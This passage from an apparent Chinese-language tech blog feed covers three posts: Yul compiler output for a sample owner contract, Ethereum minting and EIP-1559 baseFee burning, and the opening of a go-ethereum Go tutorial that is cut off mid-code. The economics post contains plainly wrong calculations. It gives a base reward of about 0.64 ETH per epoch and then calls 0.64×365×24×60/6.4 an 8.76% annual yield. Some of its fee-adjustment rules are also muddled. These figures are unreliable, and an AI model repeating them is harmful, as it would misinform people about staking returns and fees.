- `0x893d20e8`: 对应 `getOwner()`。
- `0x8da5cb5b`: 对应 `owner()`。
- 如果没有匹配的函数选择器，默认执行空操作。
</code></pre>
<h3 id="构造函数（constructor-Sample-35）"><a href="#构造函数（constructor-Sample-35）" class="headerlink" title="构造函数（constructor_Sample_35）"></a>构造函数（<code>constructor_Sample_35</code>）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let expr_8 := caller()</span><br><span class="line">/// @src 0:130:148  &quot;owner = msg.sender&quot;</span><br><span class="line">update_storage_value_offset_0_t_address_to_t_address(0x00, expr_8)</span><br><span class="line">let expr_9 := expr_8</span><br></pre></td></tr></table></figure>

<ul>
<li>获取合约部署者地址（<code>caller()</code>）并存储到 <code>owner</code> 槽位（存储槽位 0）。</li>
<li><code>update_storage_value_offset_0_t_address_to_t_address</code> 是一个存储更新的通用函数。</li>
</ul>
<h3 id="外部函数实现"><a href="#外部函数实现" class="headerlink" title="外部函数实现"></a>外部函数实现</h3><h4 id="setOwner-address"><a href="#setOwner-address" class="headerlink" title="setOwner(address)"></a><code>setOwner(address)</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function external_fun_setOwner_34() &#123;</span><br><span class="line"></span><br><span class="line">    if callvalue() &#123; revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() &#125;</span><br><span class="line">    </span><br><span class="line">    /// 将地址参数 `_owner` 从调用数据中解码。</span><br><span class="line">    let param_0 :=  abi_decode_tuple_t_address(4, calldatasize())</span><br><span class="line"> </span><br><span class="line"> /// 更新存储</span><br><span class="line">    let ret_0 :=  fun_setOwner_34(param_0)</span><br><span class="line">    let memPos := allocate_unbounded()</span><br><span class="line">    let memEnd := abi_encode_tuple_t_bool__to_t_bool__fromStack(memPos , ret_0)</span><br><span class="line">    return(memPos, sub(memEnd, memPos))</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>更新存储：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function fun_setOwner_34(var__owner_22) -&gt; var__25 &#123;</span><br><span class="line">    /// @src 0:298:302  &quot;bool&quot;</span><br><span class="line">    let zero_t_bool_1 := zero_value_for_split_t_bool()</span><br><span class="line">    var__25 := zero_t_bool_1</span><br><span class="line"></span><br><span class="line">    /// @src 0:322:328  &quot;_owner&quot;</span><br><span class="line">    let _2 := var__owner_22</span><br><span class="line">    let expr_28 := _2</span><br><span class="line">    /// @src 0:314:328  &quot;owner = _owner&quot;</span><br><span class="line">    /// 将 `_owner` 更新到 `owner` 的存储槽位（0）。</span><br><span class="line">    update_storage_value_offset_0_t_address_to_t_address(0x00, expr_28)</span><br><span class="line">    let expr_29 := expr_28</span><br><span class="line">    /// @src 0:345:349  &quot;true&quot;</span><br><span class="line">    let expr_31 := 0x01</span><br><span class="line">    /// @src 0:338:349  &quot;return true&quot;</span><br><span class="line">    var__25 := expr_31</span><br><span class="line">    leave</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<pre><code>- 返回布尔值 `true`，表示操作成功。
</code></pre>
<h4 id="getOwner"><a href="#getOwner" class="headerlink" title="getOwner()"></a><code>getOwner()</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">        function external_fun_getOwner_20() &#123;</span><br><span class="line"></span><br><span class="line">            if callvalue() &#123; revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() &#125;</span><br><span class="line">            abi_decode_tuple_(4, calldatasize())</span><br><span class="line"></span><br><span class="line">/// 从存储槽位读取 `owner`</span><br><span class="line">            let ret_0 :=  fun_getOwner_20()</span><br><span class="line">            </span><br><span class="line">            let memPos := allocate_unbounded()</span><br><span class="line">            let memEnd := abi_encode_tuple_t_address__to_t_address__fromStack(memPos , ret_0)</span><br><span class="line">            /// 将结果编码为 ABI 格式并返回。</span><br><span class="line">            return(memPos, sub(memEnd, memPos))</span><br><span class="line"></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function fun_getOwner_20() -&gt; var__15 &#123;</span><br><span class="line">    /// @src 0:204:211  &quot;address&quot;</span><br><span class="line">    let zero_t_address_3 := zero_value_for_split_t_address()</span><br><span class="line">    var__15 := zero_t_address_3</span><br><span class="line"></span><br><span class="line">    /// @src 0:230:235  &quot;owner&quot;</span><br><span class="line">    /// 读取存储槽位 0 的值，即当前合约的 `owner` 地址。</span><br><span class="line">    let _4 := read_from_storage_split_offset_0_t_address(0x00)</span><br><span class="line">    let expr_17 := _4</span><br><span class="line">    /// @src 0:223:235  &quot;return owner&quot;</span><br><span class="line">    var__15 := expr_17</span><br><span class="line">    leave</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="辅助函数"><a href="#辅助函数" class="headerlink" title="辅助函数"></a>辅助函数</h3><ul>
<li><strong><code>allocate_unbounded</code></strong>: 分配内存。</li>
<li><strong><code>abi_decode</code> 和 <code>abi_encode</code></strong>: 解码和编码 ABI 数据。</li>
<li><strong><code>cleanup</code></strong>: 用于数据清理，确保值符合地址或布尔格式。</li>
<li><strong><code>shift</code></strong>: 位操作，用于提取或存储特定位数据。</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li>该 Yul 文件表示了 <code>Sample</code> 合约的部署和运行时逻辑，分为部署代码和运行时代码。</li>
<li>核心逻辑如存储更新、函数选择、参数解码&#x2F;编码都通过低级 Yul 操作实现。</li>
<li>Yul 提供了更高效、更贴近 EVM 的执行语义，同时保留了逻辑清晰度。</li>
</ul>
]]></content>
      <categories>
        <category>blockchain</category>
      </categories>
      <tags>
        <tag>ethereum</tag>
        <tag>solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>Ethereum 微观经济</title>
    <url>/2024/12/23/blockchain/ethereum/ethereum-micro-economy/</url>
    <content><![CDATA[<p>在以太坊中，存在一个<strong>铸造</strong>和<strong>销毁</strong>机制的平衡，这样可以有效控制以太坊的供应量，防止通货膨胀或通货紧缩，同时促进ETH的价值保持稳定。这个平衡的关键是：  </p>
<ul>
<li><strong>铸造过程</strong>：指通过出块奖励为验证者铸造新的ETH。  </li>
<li><strong>销毁过程</strong>：通过交易中 <code>baseFee</code> 的销毁来减少ETH的总供应量。</li>
</ul>
<h1 id="铸造过程：新区块奖励"><a href="#铸造过程：新区块奖励" class="headerlink" title="铸造过程：新区块奖励"></a>铸造过程：新区块奖励</h1><p>在以太坊的<strong>PoS（权益证明）</strong>模式下，每当一个新区块被生产时，系统会给予验证者一定数量的ETH作为奖励。这些奖励是通过<strong>以太坊网络</strong>的共识机制铸造出来的，是<strong>凭空创造</strong>的。</p>
<h2 id="奖励计算公式"><a href="#奖励计算公式" class="headerlink" title="奖励计算公式"></a>奖励计算公式</h2><p>以太坊2.0的验证者奖励包括了基础奖励（由区块生产产生）和根据**<code>baseFee</code>** 的销毁以及网络活动（例如gas价格）带来的额外奖励。</p>
<h3 id="基础奖励（Base-Reward）"><a href="#基础奖励（Base-Reward）" class="headerlink" title="基础奖励（Base Reward）"></a>基础奖励（Base Reward）</h3><p>   每个验证者在每个 Epoch 中的基础奖励基于质押总量和总验证者数量计算。  </p>
<p>   <strong>公式：</strong>  </p>
<p>$$\text{Base Reward} &#x3D; \frac{\text{Effective Balance} \times R}{\text{Total Balance}}$$</p>
<ul>
<li><strong>Effective Balance</strong>: 验证者的有效质押余额（最多 32 ETH，过多部分不计入）。  </li>
<li><strong>R</strong>: 奖励因子，与网络的总质押量（<code>Total Balance</code>）相关。  </li>
<li><strong>Total Balance</strong>: 网络中所有验证者的质押总量。</li>
</ul>
<p>   <strong>R 的计算</strong>：</p>
<p>$$R &#x3D; \frac{\text{Base Reward Per Increment}}{\sqrt{\text{Total Active Balance}}}$$</p>
<ul>
<li><strong>Base Reward Per Increment</strong>: 固定参数，当前为 64（具体值可能随协议更新变化）。  </li>
<li><strong>Total Active Balance</strong>: 所有验证者的活跃质押余额总和。</li>
</ul>
<p>   <strong>简化理解</strong>：总质押越高，每个验证者的奖励越低；总质押越低，每个验证者的奖励越高。</p>
<h3 id="出块奖励（Proposer-Reward）"><a href="#出块奖励（Proposer-Reward）" class="headerlink" title="出块奖励（Proposer Reward）"></a>出块奖励（Proposer Reward）</h3><p>   出块的验证者会获得额外的奖励，通常来自网络中的交易小费（<code>Tip</code>）。<br>   <strong>公式：</strong></p>
<p>   $$\text{Proposer Reward} &#x3D; \frac{1}{8} \times \text{Total Attestation Rewards}$$</p>
<ul>
<li><strong>Total Attestation Rewards</strong>: 当前区块中其他验证者的总奖励。</li>
</ul>
<h3 id="小费（Tips）"><a href="#小费（Tips）" class="headerlink" title="小费（Tips）"></a>小费（Tips）</h3><p>   验证者还可以通过出块收取交易小费，作为额外的激励。<br>   <strong>公式：</strong></p>
<p>$$\text{Tips} &#x3D; \text{maxPriorityFeePerGas} \times \text{GasUsed}$$</p>
<ul>
<li>小费是交易者直接支付给验证者的费用，主要用于提升交易优先级。</li>
</ul>
<h2 id="奖励的分配"><a href="#奖励的分配" class="headerlink" title="奖励的分配"></a>奖励的分配</h2><p><strong>出块奖励</strong>：主要分配给验证者。具体的奖励数量和验证者质押的ETH数量有关。  </p>
<p><strong>验证者奖励（年化）</strong>：网络中的所有验证者按质押ETH的比例来分享总的奖励池，基于<strong>年化利率</strong>进行分配。</p>
<ol>
<li><p><strong>基础奖励分配</strong><br>验证者参与网络共识（如投票或提议新区块）时，按比例分配基础奖励。未按要求参与时将减少奖励。</p>
</li>
<li><p><strong>附加奖励分配</strong><br>验证者根据其行为（如投票是否及时、正确）获得额外奖励。<br><strong>行为奖励类型：</strong></p>
<ul>
<li><strong>同步贡献奖励</strong>：如果验证者正确参与区块提议和投票。  </li>
<li><strong>罚没机制</strong>：恶意行为（如双签名）导致奖励减少或直接罚没部分质押。</li>
</ul>
</li>
<li><p><strong>动态调整年化收益率</strong>  </p>
<ul>
<li>质押总量（网络参与率）影响验证者奖励：<br> $$\text{Yearly Yield} \propto \frac{1}{\sqrt{\text{Total Stake}}}$$</li>
<li>如果质押率较低，验证者的年化收益率上升，激励更多人质押。</li>
</ul>
</li>
</ol>
<p><strong>触发铸造的条件</strong>：</p>
<ul>
<li>每生产一个新区块，系统会根据当前的奖励机制铸造出新的ETH，并将其奖励给验证者。  </li>
<li>该过程的触发条件就是区块的产生与验证，且与链上交易的数量、复杂度等因素无关。</li>
</ul>
<h2 id="举例计算"><a href="#举例计算" class="headerlink" title="举例计算"></a><strong>举例计算</strong></h2><p>假设：</p>
<ul>
<li>网络总质押量：10,000,000 ETH  </li>
<li>验证者质押：32 ETH  </li>
<li>基础奖励因子：64</li>
</ul>
<ol>
<li><p><strong>基础奖励</strong><br>$$<br>\text{Base Reward} &#x3D; \frac{32 \times 64}{\sqrt{10,000,000}} \approx 0.64 , \text{ETH &#x2F; Epoch}<br>$$<br>每 6.4 分钟获得约 0.64 ETH。</p>
</li>
<li><p><strong>年化收益率</strong><br>$$<br>\text{Yearly Yield} &#x3D; 0.64 \times 365 \times 24 \times 60 &#x2F; 6.4 \approx 8.76 % , \text{年化收益率}<br>$$</p>
</li>
</ol>
<hr>
<h1 id="销毁过程：baseFee-的销毁"><a href="#销毁过程：baseFee-的销毁" class="headerlink" title="销毁过程：baseFee 的销毁"></a>销毁过程：<code>baseFee</code> 的销毁</h1><p>为了防止ETH的通货膨胀，<strong>EIP-1559</strong> 引入了销毁机制，旨在通过<strong>销毁<code>baseFee</code></strong> 来减少ETH的总供应量，从而对抗铸造过程带来的通货膨胀。</p>
<h2 id="baseFee-销毁机制"><a href="#baseFee-销毁机制" class="headerlink" title="baseFee 销毁机制"></a><code>baseFee</code> 销毁机制</h2><p><code>baseFee</code>是由网络中的区块大小决定的基础费用，动态调整，以保持网络的区块容量稳定。这个费用的<strong>一部分会被销毁</strong>，而不是奖励给验证者。  在以太坊中，<code>baseFee</code> 是交易费用的一部分，定义了在一个区块中执行交易所需支付的最低费用。在 <strong>EIP-1559</strong> 提案中，<code>baseFee</code> 引入了一个<strong>动态调整机制</strong>，该机制根据网络的负载和拥堵情况自动调整 <code>baseFee</code> 的值。这个调节机制的设计目标是优化交易费用的透明性和可预测性，并避免交易费用波动过大。</p>
<h3 id="1-baseFee-机制的基本概念"><a href="#1-baseFee-机制的基本概念" class="headerlink" title="1. baseFee 机制的基本概念"></a>1. <code>baseFee</code> 机制的基本概念</h3><p><code>baseFee</code> 是每笔交易的最低费用，并且是由网络自动调节的，基于以下几个因素：</p>
<ul>
<li>网络当前的 <strong>负载</strong>（即当前区块的使用情况）。</li>
<li>网络 <strong>目标的区块大小</strong>（即区块目标的 gas 限额）。</li>
</ul>
<p>EIP-1559 改变了传统的以太坊费用模型，使得交易费用变得更加<strong>可预测</strong>，并且将一部分费用 <strong>销毁</strong>，而不是支付给矿工。<code>baseFee</code> 作为这部分费用的核心部分，其动态调整机制起到了关键作用。</p>
<h3 id="2-baseFee-的动态调节原理"><a href="#2-baseFee-的动态调节原理" class="headerlink" title="2. baseFee 的动态调节原理"></a>2. <code>baseFee</code> 的动态调节原理</h3><p><code>baseFee</code> 是根据上一块区块的拥堵情况进行调整的。调整的规则如下：</p>
<ul>
<li><strong>目标区块大小</strong>：以太坊的目标区块大小是 <strong>15,000,000 gas</strong>（以太坊网络上的一个理想值）。区块的实际大小会决定 <code>baseFee</code> 的调整。</li>
<li><strong>如果区块的 gas 使用量高于目标（即区块接近 15,000,000 gas）</strong>，<code>baseFee</code> 会<strong>增加</strong>，以此来降低交易的需求，并避免网络拥堵。</li>
<li><strong>如果区块的 gas 使用量低于目标（即区块未满）</strong>，<code>baseFee</code> 会<strong>减少</strong>，以鼓励更多交易的提交，提升区块的利用率。</li>
</ul>
<p>具体的调整规则是基于区块内的 gas 使用量（<code>gasUsed</code>）与目标值（<code>gasTarget</code>）之间的差异来计算：</p>
<ul>
<li>每个区块的 <code>baseFee</code> 会根据以下公式调整：</li>
</ul>
<p>$$<br>  \text{new baseFee} &#x3D; \text{old baseFee} + \text{adjustment}<br>$$</p>
<p>  其中，<code>adjustment</code> 是根据以下条件计算的：</p>
<ul>
<li><strong>如果区块的 gas 使用量高于目标</strong>，<code>baseFee</code> 会增加。增加的幅度为 <code>baseFee</code> 的 <strong>1&#x2F;8</strong>。</li>
<li><strong>如果区块的 gas 使用量低于目标</strong>，<code>baseFee</code> 会减少。减少的幅度同样是 <code>baseFee</code> 的 <strong>1&#x2F;8</strong>。</li>
</ul>
<p>  即：</p>
<p>$$<br>  \text{adjustment} &#x3D; \text{baseFee} \times \frac{1}{8} \times \left( \frac{\text{gasUsed}}{\text{gasTarget}} - 1 \right)<br>$$</p>
<p>  这个公式确保了 <code>baseFee</code> 逐渐适应区块的实际使用情况，避免了过大的波动。</p>
<ul>
<li><strong>调整的上限和下限</strong>：<ul>
<li><code>baseFee</code> 的调整是逐步的，每个区块的 <code>baseFee</code> 相对于上一块最多只能增加或减少 <code>1/8</code>。</li>
<li>这意味着即使网络负载突然增加或减少，<code>baseFee</code> 也不会立即发生剧烈变化，避免了费用过高或过低的极端情况。</li>
</ul>
</li>
</ul>
<h3 id="3-baseFee-、-maxFeePerGas-、gasLimit和-maxPriorityFeePerGas-的关系"><a href="#3-baseFee-、-maxFeePerGas-、gasLimit和-maxPriorityFeePerGas-的关系" class="headerlink" title="3. baseFee 、 maxFeePerGas 、gasLimit和 maxPriorityFeePerGas 的关系"></a>3. <code>baseFee</code> 、 <code>maxFeePerGas</code> 、<code>gasLimit</code>和 <code>maxPriorityFeePerGas</code> 的关系</h3><p>在以太坊的<strong>EIP-1559</strong> 交易费用模型中，**<code>maxFeePerGas</code>**, <strong><code>maxPriorityFeePerGas</code></strong>, <strong><code>baseFee</code></strong>, 和 <strong><code>gas limit</code></strong> 是关键参数，它们共同决定了用户支付的总交易费用以及矿工&#x2F;验证者的收入。</p>
<h4 id="定义与含义"><a href="#定义与含义" class="headerlink" title="定义与含义"></a>定义与含义</h4><ul>
<li><p>**<code>maxFeePerGas</code>**：</p>
<ul>
<li>用户愿意为交易支付的每单位<code>gas</code>的最大费用（总上限）。</li>
<li>这是用户设定的费用上限，用于限制支付的最高费用。</li>
<li>单位：Gwei。</li>
</ul>
</li>
<li><p>**<code>maxPriorityFeePerGas</code>**：</p>
<ul>
<li>用户希望额外支付给矿工&#x2F;验证者的每单位<code>gas</code>的小费（奖励）。</li>
<li>这个值是用户主动提供的，通常用于鼓励矿工&#x2F;验证者优先处理自己的交易。</li>
<li>单位：Gwei。</li>
<li>如果设置为0，则交易没有小费。</li>
</ul>
</li>
<li><p>**<code>baseFee</code>**：</p>
<ul>
<li>每单位<code>gas</code>的基础费用，由网络动态调整，决定交易执行所需的最小费用。</li>
<li>由协议规定，所有交易的<code>baseFee</code>部分都会被销毁，而不是分配给矿工&#x2F;验证者。</li>
<li>单位：Gwei。</li>
<li><strong>动态调整规则</strong>：<ul>
<li>如果区块的实际<code>gas</code>使用量超过目标（区块<code>gas limit</code>的一半），则<code>baseFee</code>会增加。</li>
<li>如果使用量低于目标，则<code>baseFee</code>会减少。</li>
</ul>
</li>
</ul>
</li>
<li><p>**<code>gas limit</code>**：</p>
<ul>
<li>交易中可以消耗的最大<code>gas</code>数量，用户设定的上限。</li>
<li>确保用户不会为超出需求的计算支付费用。</li>
<li>区块级的<code>gas limit</code>决定了整个区块内最多可消耗的<code>gas</code>数量。</li>
</ul>
</li>
</ul>
<h4 id="计算逻辑与关系"><a href="#计算逻辑与关系" class="headerlink" title="计算逻辑与关系"></a>计算逻辑与关系</h4><p><strong>用户实际支付的费用（effective gas fee）</strong><br>用户为每单位<code>gas</code>实际支付的费用可以表示为：<br>$$<br>\text{Effective Gas Fee} &#x3D; \text{baseFee} + \min(\text{maxPriorityFeePerGas}, (\text{maxFeePerGas} - \text{baseFee}))<br>$$</p>
<ul>
<li><strong>解释</strong>：<ul>
<li>**<code>baseFee</code>**：这是网络最低要求的费用，每笔交易都必须支付。</li>
<li><strong>小费部分</strong>：用户支付的实际小费是<code>maxPriorityFeePerGas</code>与<code>maxFeePerGas - baseFee</code>的较小值。</li>
<li>如果<code>maxFeePerGas</code>不足以覆盖<code>baseFee</code>，交易将被拒绝。</li>
</ul>
</li>
</ul>
<p><strong>总交易费用（total transaction fee）</strong><br>用户支付的总费用计算为：<br>$$<br>\text{Total Transaction Fee} &#x3D; \text{Effective Gas Fee} \times \text{Gas Used}<br>$$</p>
<ul>
<li><p>**<code>Gas Used</code>**：是交易实际消耗的<code>gas</code>量，通常小于或等于用户设置的<code>gas limit</code>。</p>
</li>
<li><p><strong><code>baseFee</code> 与 <code>maxFeePerGas</code> 的关系</strong>：</p>
<ul>
<li>如果用户设定的<code>maxFeePerGas</code>小于当前的<code>baseFee</code>，交易无法提交。</li>
<li>用户支付的实际费用不会超过<code>maxFeePerGas</code>。</li>
</ul>
</li>
<li><p><strong><code>maxPriorityFeePerGas</code> 与 <code>maxFeePerGas</code> 的关系</strong>：</p>
<ul>
<li><code>maxPriorityFeePerGas</code> 决定用户愿意支付的小费，实际的小费不能超过<code>maxFeePerGas - baseFee</code>。</li>
<li>如果<code>baseFee</code>接近<code>maxFeePerGas</code>，小费部分会自动减少。</li>
</ul>
</li>
<li><p><strong><code>gas limit</code> 的作用</strong>：</p>
<ul>
<li>用户设定的<code>gas limit</code>决定了交易的最大<code>gas</code>消耗。</li>
<li>用户支付的总费用与实际消耗的<code>gas</code>数量相关，未使用的<code>gas</code>会退还。</li>
</ul>
</li>
</ul>
<h4 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a>举例说明</h4><p><strong>假设参数如下：</strong></p>
<ul>
<li><code>maxFeePerGas = 50 Gwei</code></li>
<li><code>maxPriorityFeePerGas = 10 Gwei</code></li>
<li><code>baseFee = 30 Gwei</code></li>
<li><code>gas limit = 21,000</code></li>
</ul>
<p><strong>计算步骤：</strong></p>
<ol>
<li><p><strong>有效单价（Effective Gas Fee）</strong>：<br>$$<br>\text{Effective Gas Fee} &#x3D; \text{baseFee} + \min(\text{maxPriorityFeePerGas}, (\text{maxFeePerGas} - \text{baseFee}))<br>$$<br>$$<br>\text{Effective Gas Fee} &#x3D; 30 + \min(10, (50 - 30)) &#x3D; 30 + 10 &#x3D; 40 , \text{Gwei}<br>$$</p>
</li>
<li><p><strong>总费用（Total Transaction Fee）</strong>：<br>$$<br>\text{Total Transaction Fee} &#x3D; \text{Effective Gas Fee} \times \text{Gas Used}<br>$$<br>如果实际使用的<code>gas</code>为21,000：<br>$$<br>\text{Total Transaction Fee} &#x3D; 40 \times 21,000 &#x3D; 840,000 , \text{Gwei} &#x3D; 0.00084 , \text{ETH}<br>$$</p>
</li>
<li><p><strong>销毁的ETH</strong>：</p>
<ul>
<li><p>销毁部分仅包含<code>baseFee</code>：</p>
<p>$$\text{Burned Fee} &#x3D; \text{baseFee} \times \text{Gas Used}$$<br>$$\text{Burned Fee} &#x3D; 30 \times 21,000 &#x3D; 630,000 , \text{Gwei} &#x3D; 0.00063 , \text{ETH}$$</p>
</li>
</ul>
</li>
<li><p><strong>验证者收益（小费部分）</strong>：</p>
<ul>
<li>小费是<code>maxPriorityFeePerGas</code>：<br>$$\text{Tip} &#x3D; 10 \times 21,000 &#x3D; 210,000 , \text{Gwei} &#x3D; 0.00021 , \text{ETH}$$</li>
</ul>
</li>
</ol>
<h3 id="4-销毁的机制与-baseFee"><a href="#4-销毁的机制与-baseFee" class="headerlink" title="4. 销毁的机制与 baseFee"></a>4. 销毁的机制与 <code>baseFee</code></h3><p>在 EIP-1559 机制中，<code>baseFee</code> 不会直接支付给矿工，而是被<strong>销毁</strong>（burned），从而减少 ETH 的总供应量。</p>
<ul>
<li>销毁的 ETH 数量是根据每个区块的 <code>baseFee</code> 和区块的 gas 使用量（<code>gasUsed</code>）来决定的。</li>
<li>销毁的 ETH 量等于每个交易的 <code>baseFee</code> 与该交易消耗的 gas 量的乘积：</li>
</ul>
<p>$$<br>  \text{burned ETH} &#x3D; \text{baseFee} \times \text{gasUsed}<br>$$</p>
<p>  随着网络交易量的增加，销毁的 ETH 数量也会增多，从而可能导致 ETH 的供应量减少，产生通货紧缩的效果。</p>
<p><strong>销毁过程</strong>：每当发生交易时，系统会根据交易中的<code>baseFee</code>来销毁一定数量的ETH。这意味着**<code>baseFee</code>** 部分的ETH会永久消失，从而减少市场上的ETH总供应量。</p>
<p><strong><code>baseFee</code> 的销毁机制会被触发的情况</strong>：</p>
<ul>
<li>当用户发起交易时，交易费用中包含的 <strong><code>baseFee</code></strong> 会被销毁，而不是奖励给矿工或验证者。  </li>
<li><code>baseFee</code> 会随着网络的拥堵情况动态调整，当区块满时，<code>baseFee</code> 增加；反之，当区块空闲时，<code>baseFee</code> 会减少。  </li>
<li>销毁的<code>baseFee</code> 每个区块的具体数量是通过算法自动计算的，并且每个区块的<code>baseFee</code>会根据网络的拥堵状况自动变化。</li>
</ul>
<h2 id="触发销毁的过程"><a href="#触发销毁的过程" class="headerlink" title="触发销毁的过程"></a>触发销毁的过程</h2><ul>
<li>触发销毁的主要过程是用户发起交易并提交到网络中。这时，系统会根据交易的<code>gasPrice</code>（包括<code>baseFee</code>和<code>maxPriorityFeePerGas</code>）来计算销毁的ETH数量。</li>
<li>除了交易之外，某些智能合约的操作也会触发<code>baseFee</code>的销毁。例如，执行合约调用时，合约内部的交易（如ERC-20代币转账）也会根据相应的<code>baseFee</code>销毁ETH。</li>
</ul>
<hr>
<h1 id="良性循环：铸造和销毁的平衡"><a href="#良性循环：铸造和销毁的平衡" class="headerlink" title="良性循环：铸造和销毁的平衡"></a>良性循环：铸造和销毁的平衡</h1><p><strong>铸造与销毁形成平衡</strong>：</p>
<ul>
<li><strong>铸造过程</strong>：每个新区块奖励一定数量的ETH给验证者，增加市场的ETH供应量。</li>
<li><strong>销毁过程</strong>：通过销毁<code>baseFee</code>，减少市场的ETH供应量，避免过度膨胀。</li>
</ul>
<p><strong>如何保持ETH供应量稳定？</strong></p>
<ul>
<li>在一个健康的以太坊网络中，<strong>铸造和销毁机制会共同作用</strong>，实现供需平衡，防止过度的通货膨胀。</li>
<li><strong>销毁机制对供应量的影响</strong>：通过销毁<code>baseFee</code>，ETH的供应量会得到控制。具体销毁多少ETH，取决于网络的交易量和拥堵状况。</li>
<li><strong>网络需求与奖励</strong>：交易量越高，<code>baseFee</code> 就越高，销毁的ETH就越多，这可以有效减缓通货膨胀的速度。</li>
<li><strong>验证者奖励</strong>：验证者通过出块得到的奖励是新增的ETH，在网络正常运行时，这部分奖励与销毁的ETH保持平衡，避免ETH的数量过快增加。</li>
</ul>
<p><strong>合适的销毁与铸造机制</strong>：</p>
<ul>
<li><strong>区块奖励与销毁的关系</strong>：销毁<code>baseFee</code>的ETH，有时可能会比新增奖励的ETH更多，这就可能导致长期内ETH的总供应量减少，进而形成某种程度的<strong>通货紧缩</strong>。</li>
<li>在交易需求高、<code>baseFee</code> 较高的情况下，销毁的ETH数量可能大于验证者奖励的ETH，从而实现一个<strong>负增长</strong>或稳定的供应量。</li>
<li>在交易需求低、<code>baseFee</code> 较低的情况下，新增的ETH数量可能高于销毁量，导致ETH的供应量逐渐增加。</li>
</ul>
]]></content>
      <categories>
        <category>blockchain</category>
      </categories>
      <tags>
        <tag>ethereum</tag>
      </tags>
  </entry>
  <entry>
    <title>当需要用Go调用Ethereum的时候</title>
    <url>/2025/01/07/blockchain/ethereum/call-eth-with-golang/</url>
    <content><![CDATA[<p>使用Go的官方以太坊实现<a href="https://github.com/ethereum/go-ethereum">go-ethereum</a>来和以太坊区块链进行交互。Go-ethereum，也被简称为Geth，是最流行的以太坊客户端。因为它是用Go开发的，当使用Golang开发应用程序时，Geth提供了读写区块链的一切功能。</p>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul>
<li>go version go1.23.0 darwin&#x2F;arm64</li>
<li>github.com&#x2F;ethereum&#x2F;go-ethereum v1.14.12</li>
<li>github.com&#x2F;gin-gonic&#x2F;gin v1.10.0</li>
</ul>
<h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><p>完整代码请见：<a href="https://github.com/zhoubofsy/web3_golang/tree/main/gin">https://github.com/zhoubofsy/web3_golang/tree/main/gin</a></p>
<h2 id="Balance查看"><a href="#Balance查看" class="headerlink" title="Balance查看"></a>Balance查看</h2><p><em>account.go</em></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> OpAccount <span class="keyword">struct</span> &#123;</span><br><span class="line">  client *blockchain.Client</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(op *OpAccount)</span></span> GetBalance(accountID <span class="type">string</span>, blkNum *big.Int) (*big.Int, <span class="type">error</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> accountID == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, ErrAccountIDRequired</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 实现获取余额</span></span><br><span class="line">  <span class="keyword">return</span> op.client.Eth.BalanceAt(context.Background(), common.HexToAddress(accountID), blkNum)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(op *OpAccount)</span></span> GetPendingBalance(accountID <span class="type">string</span>) (*big.Int, <span class="type">error</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> accountID == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, ErrAccountIDRequired</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> op.client.Eth.PendingBalanceAt(context.Background(), common.HexToAddress(accountID))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Block查询"><a href="#Block查询" class="headerlink" title="Block查询"></a>Block查询</h2><p><em>block.go</em></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> OpBlock <span class="keyword">struct</span> &#123;</span><br><span class="line">  client *blockchain.Client</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewOpBlock</span><span class="params">(client *blockchain.Client)</span></span> *OpBlock &#123;</span><br><span class="line">  <span class="keyword">return</span> &amp;OpBlock&#123;</span><br><span class="line">    client: client,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(op *OpBlock)</span></span> GetBlockNumber() (<span class="type">uint64</span>, <span class="type">error</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> op.client.Eth.BlockNumber(context.Background())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(op *OpBlock)</span></span> GetBlockInfo(number <span class="type">uint64</span>) (BlockInfo, <span class="type">error</span>) &#123;</span><br><span class="line">  blkInfo, err := op.client.Eth.BlockByNumber(context.Background(), big.NewInt(<span class="type">int64</span>(number)))</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> BlockInfo&#123;&#125;, err</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> BlockInfo&#123;</span><br><span class="line">    Hash:       blkInfo.Hash().Hex(),</span><br><span class="line">    Height:     blkInfo.Number().Uint64(),</span><br><span class="line">    Timestamp:  blkInfo.Time(),</span><br><span class="line">    